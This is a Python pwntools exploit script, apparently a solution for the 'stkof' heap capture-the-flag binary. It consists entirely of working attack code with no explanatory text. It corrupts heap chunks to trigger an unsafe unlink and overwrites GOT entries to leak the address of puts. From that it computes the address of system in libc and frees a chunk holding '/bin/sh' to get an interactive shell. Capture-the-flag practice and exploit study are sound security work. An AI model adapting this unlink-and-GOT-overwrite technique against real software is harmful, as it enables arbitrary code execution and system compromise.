#-* coding:utf -*

"""
python 2.7
"""

from pwn import *
context.log_level = 'debug'

def alloc(p):
    p.sendline("1")
    p.sendline("128")
    p.recvuntil("OK\n")

def edit(p,idx,content):
    p.sendline("2")
    p.sendline(str(idx))
    p.sendline(str(len(content)))
    p.send(content)
    p.recvuntil("OK\n")

def free(p,idx):
    p.sendline("3")
    p.sendline(str(idx))

libc = ELF("/lib/x86_64-linux-gnu/libc-2.23.so")
stkof = ELF("./stkof")
p = process("./stkof")
g_addr = 0x602150

alloc(p)
alloc(p)
alloc(p)

payload1 = '\x00'*0x10 + p64(g_addr-0x18) + p64(g_addr-0x10) + 'a'*0x60 + p64(0x80) + p64(0x90)

edit(p,2,payload1)
# 1.bypass unlink
free(p,3)
p.recvuntil("OK\n")

# 2.overwrite got table
payload2 = p64(0)*2 + p64(stkof.got["free"]) + p64(stkof.got["puts"])
edit(p,2,payload2)

payload3 = p64(stkof.plt["puts"])
edit(p,1,payload3)

# 3.leak puts addr
free(p,2)
# puts_addr = u64(p.recv(6) + "\x00\x00")
# puts_addr = p.recv(6).strip().ljust(8,"\x00")
# p.recv(4)
puts_addr = p.recv(6).ljust(8,'\x00')
p.recv(4)
puts_addr = u64(puts_addr)
print("xxxxleakkkkk") #0x7ffff7a7c690
print hex(puts_addr)


system_addr = puts_addr - libc.symbols["puts"] + libc.symbols["system"]
# binsh_addr = puts_addr - libc.symbols["puts"] + next(libc.search('/bin/sh'))
log.success('system addr: ' + hex(system_addr))

# 4.continue overwrite got table
payload4 = p64(system_addr)
edit(p,1,payload4)

# 5.exec sh
alloc(p)
binsh="/bin/sh\x00"
edit(p,4,binsh)
context.terminal = ['./stkof', '-e', 'sh', '-c']
# gdb.attach(p)
log.info("[Exec sh...]")
free(p,4)
p.interactive()